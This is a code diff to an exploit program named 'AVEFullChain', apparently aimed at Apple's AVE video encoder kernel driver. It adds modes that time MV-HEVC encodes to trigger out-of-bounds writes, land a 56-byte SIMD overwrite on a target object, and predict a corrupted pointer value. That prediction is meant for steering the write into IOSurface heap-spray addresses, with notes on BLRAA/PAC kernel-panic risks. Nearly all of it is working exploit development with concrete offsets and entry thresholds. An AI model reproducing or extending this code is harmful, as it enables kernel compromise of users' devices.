@@ -13,6 +13,7 @@
  *
  * Key thresholds (all entries from first VPS table at buffer+0x3770):
  *   Entry 256 (~86 encodes): First OOB write
+ *   Entry 601 (~200 encodes): +0x5C88 SIMD target pointer (CUMSUM corrupts!)
  *   Entry 602 (~201 encodes): Guard array +0x5D14 (branch misroute)
  *   Entry 630 (~210 encodes): Cross-object 56-byte write (+0x5ED4)
  *   Entry 642 (~214 encodes): Forced BLRAA (+0x5F94)
@@ -546,6 +547,81 @@ int main(int argc, char *argv[]) {
         if (phase1_verify() != 0) goto done;
         phase5_firmware(enc, lid);
 
+    } else if (strcmp(mode, "simd_target") == 0) {
+        rlog("SIMD_TARGET: Precisely target entries #630-633 (56-byte overwrite)\n");
+        rlog("The LDP Q0,Q1 + LDR Q2 + LDR X8 at 0x1765bcc copies 56 bytes\n");
+        rlog("from entries 630-633 to target object at encoder+0x5C70->offset 0x00-0x37\n");
+        rlog("Plus ~32 bytes to target+0xFC and 4 bytes to target+0x118\n\n");
+        rlog("This probe encodes EXACTLY 211 frames (633 entries = entry #632)\n");
+        rlog("to overwrite the target object header with our controlled data.\n");
+        rlog("layer_id values at entries 630-633 become bytes 4-7 of each 16-byte entry\n\n");
+        rlog("Strategy: Use different layer_id values to identify which entry maps where\n\n");
+        if (phase1_verify() != 0) goto done;
+        rlog("--- Sub-test A: 211 encodes with layer_id=0x4141 (generic marker) ---\n");
+        phase5_firmware(211, 0x4141);
+        rlog("\n--- Sub-test B: 210 encodes (stop just before SIMD overwrite) ---\n");
+        rlog("This is the SAFE baseline — entries reach 630 but not all 4 needed\n");
+        phase5_firmware(210, 0x4242);
+        rlog("\n--- Sub-test C: 215 encodes with layer_id=0xDEAD (past BLRAA trigger) ---\n");
+        rlog("WARNING: Entry 642 (+0x5F94) will be nonzero with NAL_type (1-3)\n");
+        rlog("If +0x5F94 triggers, BLRAA with PAC mismatch -> KERNEL PANIC likely\n");
+        rlog("Comment out this test if 211 encodes already panics\n");
+        phase5_firmware(215, 0xDEAD);
+
+    } else if (strcmp(mode, "simd_safe") == 0) {
+        int lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0x4141;
+        rlog("SIMD_SAFE: Exactly 210 encodes (stop BEFORE SIMD overwrite)\n");
+        rlog("layer_id=0x%x, entries ~630 = at SIMD boundary but not complete\n", lid);
+        rlog("This should be safe — the 56-byte copy needs entries 630-633\n\n");
+        if (phase1_verify() != 0) goto done;
+        phase5_firmware(210, lid);
+
+    } else if (strcmp(mode, "cumsum_predict") == 0) {
+        rlog("CUMSUM_PREDICT: Measure NAL sizes to predict cumsum at entry #601\n");
+        rlog("+0x5C88 (SIMD target pointer) is at entry 601, byte offset 8 = cumsum\n");
+        rlog("The cumsum value at entry 601 becomes the SIMD overwrite's target addr\n");
+        rlog("If we can predict/control cumsum, we can redirect the 56-byte write\n\n");
+        if (phase1_verify() != 0) goto done;
+        rlog("Phase A: Detailed NAL measurement (20 encodes)\n\n");
+        VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
+        if (!s) goto done;
+        size_t prev_bytes = 0;
+        size_t total_nal_bytes = 0;
+        int total_entries = 0;
+        for (int i = 0; i < 20; i++) {
+            int st = encode_one(s, i, 128, 128);
+            size_t delta = g_last_pset_total_bytes - (i > 0 ? prev_bytes : 0);
+            prev_bytes = g_last_pset_total_bytes;
+            rlog("[%d] status=%d psets=%zu total_bytes=%zu delta=%zu\n",
+                 i, st, g_last_pset_count, g_last_pset_total_bytes, delta);
+            if (st != 0) break;
+            total_entries += (int)g_last_pset_count;
+            total_nal_bytes += delta;
+        }
+        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+        usleep(500000);
+        VTCompressionSessionInvalidate(s); CFRelease(s);
+        rlog("\nTotal: %d entries from 20 encodes = %.1f entries/encode\n",
+             total_entries, total_entries / 20.0);
+        rlog("Total NAL bytes: %zu\n", total_nal_bytes);
+        if (total_entries > 0) {
+            double avg_nal = (double)total_nal_bytes / total_entries;
+            double avg_cumsum_inc = avg_nal / 8.0;
+            double cumsum_at_601 = avg_cumsum_inc * 601;
+            rlog("Average NAL size: %.1f bytes\n", avg_nal);
+            rlog("Average cumsum increment (data>>3): %.2f per entry\n", avg_cumsum_inc);
+            rlog("PREDICTED cumsum at entry 601: %.0f (0x%x)\n",
+                 cumsum_at_601, (uint32_t)cumsum_at_601);
+            rlog("PREDICTED cumsum at entry 630: %.0f (0x%x)\n",
+                 avg_cumsum_inc * 630, (uint32_t)(avg_cumsum_inc * 630));
+            rlog("PREDICTED cumsum at entry 642: %.0f (0x%x)\n",
+                 avg_cumsum_inc * 642, (uint32_t)(avg_cumsum_inc * 642));
+            rlog("\nFor IOSurface spray targeting:\n");
+            rlog("  kalloc.49152 addresses typically align to 0x1000 pages\n");
+            rlog("  Spray IOSurfaces, note addresses, then predict which\n");
+            rlog("  encode count places cumsum near a spray address\n");
+        }
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
@@ -556,8 +632,12 @@ int main(int argc, char *argv[]) {
         rlog("  read_only  -- OOB read only (400 encodes)\n");
         rlog("  spray      -- IOSurface spray + cross-buffer (400 encodes)\n");
         rlog("  firmware <lid> <enc> -- Custom firmware param test\n");
+        rlog("  simd_target -- Target entries #630-633 (56-byte SIMD overwrite)\n");
+        rlog("  simd_safe [lid]  -- 210 encodes, stop BEFORE SIMD overwrite\n");
+        rlog("  cumsum_predict   -- Measure NAL sizes, predict cumsum at entry 601\n");
         rlog("\nKey entry thresholds:\n");
         rlog("  256 (~86 enc):  First OOB write\n");
+        rlog("  601 (~200 enc): +0x5C88 SIMD target ptr (cumsum corruption!)\n");
         rlog("  602 (~201 enc): Guard array +0x5D14\n");
         rlog("  630 (~210 enc): 56-byte SIMD header overwrite +0x5ED4\n");
         rlog("  642 (~214 enc): Forced BLRAA +0x5F94\n");
